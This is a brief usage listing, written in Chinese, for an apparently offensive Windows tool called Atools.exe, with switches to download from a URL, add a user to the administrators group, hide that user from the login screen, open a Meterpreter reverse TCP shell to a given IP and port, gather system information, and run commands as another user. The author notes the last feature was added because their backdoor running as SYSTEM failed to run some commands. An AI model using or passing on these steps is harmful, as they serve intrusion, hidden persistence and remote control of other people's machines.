Atools.exe -h | help

Atools.exe -d url |下载

Atools.exe -u user pass |添加一个用户并加入到管理员组

Atools.exe -s user | 禁止交互式登陆时在登陆界面隐藏指定用户

Atools.exe -r ip port |windows/meterpreter/reverse_tcp

Atools.exe -i | 系统信息收集

Atools.exe -e username password command > file.txt | 以其他用户权限运行程序
(为什么会有这个，因为有时候我在system权限下运行的后门不知道为什么会无法执行一些系统命令
各种方法都试过了都没用然后在tools看了个小程序可以就改了改加了进来)



